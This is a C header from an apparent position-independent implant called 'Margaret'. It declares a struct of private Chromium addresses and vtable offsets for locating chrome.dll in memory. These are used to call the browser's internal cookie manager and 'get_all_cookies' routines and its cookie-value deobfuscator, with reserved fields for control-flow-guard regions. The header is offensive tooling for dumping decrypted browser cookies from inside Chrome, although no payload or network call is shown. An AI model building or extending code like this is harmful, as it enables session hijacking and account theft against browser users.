#ifndef MARGARET_CHROMIUM_ADAPTER_H
#define MARGARET_CHROMIUM_ADAPTER_H

#include "pic_resolve.h"

#define MARGARET_CHROMIUM_PRODUCT_CHROME 1u
#define MARGARET_CHROMIUM_TEXT_FINGERPRINT_SIZE 32u

typedef struct MARGARET_CHROMIUM_ADAPTER {
    pic_u32 adapter_version;
    pic_u32 product;
    pic_u32 version_major;
    pic_u32 version_minor;
    pic_u32 version_build;
    pic_u32 version_patch;
    pic_u32 image_size;
    pic_u32 callback_abi_version;
    pic_u32 canonical_cookie_layout_version;
    pic_u8 text_fingerprint[MARGARET_CHROMIUM_TEXT_FINGERPRINT_SIZE];

    pic_u32 rva_g_browser_process_slot;
    pic_u32 rva_get_profile_manager;
    pic_u32 rva_get_loaded_profiles;
    pic_u32 rva_get_default_storage_partition;
    pic_u32 rva_get_cookie_manager;
    pic_u32 rva_cookie_manager_get_all_cookies;
    pic_u32 rva_get_ui_task_runner;
    pic_u32 rva_post_task;
    pic_u32 rva_callback_invoker;

    pic_u32 off_browser_process_profile_manager;
    pic_u32 off_storage_partition_cookie_manager;
    pic_u32 off_mojo_remote_proxy;
    pic_u32 off_mojo_remote_state;

    pic_u16 vtbl_cookie_manager_get_all_cookies;
    pic_u16 vtbl_task_runner_post_task;

    /* Engine A anchors (network utility process). */
    pic_u32 rva_cookie_monster_vtable;
    pic_u32 rva_cookie_monster_get_all_cookies;

    /* Engine A: value accessors (direct calls, no callbacks).
     * deobfuscator ABI: fn(rcx=&obfuscated_value_, rdx=&out_string). */
    pic_u32 rva_canonical_cookie_value;
    pic_u32 rva_canonical_cookie_deobfuscator;

    /* Reserved for browser-process work — not exercised by this
     * build; see the project worksheet for the recovered values. */
    pic_u32 rva_browser_task_executor_singleton;
    pic_u32 off_endpoint_task_runner;
    pic_u32 rva_cfg_slot_region_start;
    pic_u32 rva_cfg_slot_region_end;
    pic_u32 rva_cfg_thunk_lo;
    pic_u32 rva_cfg_thunk_hi;

    pic_u32 reserved;
} MARGARET_CHROMIUM_ADAPTER;

/*
 * Selection gate.  Returns the adapter matching the loaded chrome.dll or
 * PIC_NULL.  Callers must treat a NULL result as "unsupported build" and
 * must not call into any private Chromium address without a selected
 * adapter.  Implemented in src/adapter.c (.text$E).
 */
PIC_CODE pic_bool PIC_MS_ABI
margaret_select_chromium_adapter(void *chrome_base, pic_u32 image_size,
                                  MARGARET_CHROMIUM_ADAPTER *out_adapter);

/* Locate the loaded chrome.dll through the resolver and validate its PE
 * headers.  Returns PIC_FALSE (resolver error recorded in
 * ctx->last_error) without touching any output on failure. */
pic_bool PIC_MS_ABI margaret_locate_chrome_dll(PIC_CONTEXT *ctx,
                                                void **chrome_base,
                                                pic_u32 *image_size);

#endif /* MARGARET_CHROMIUM_ADAPTER_H */
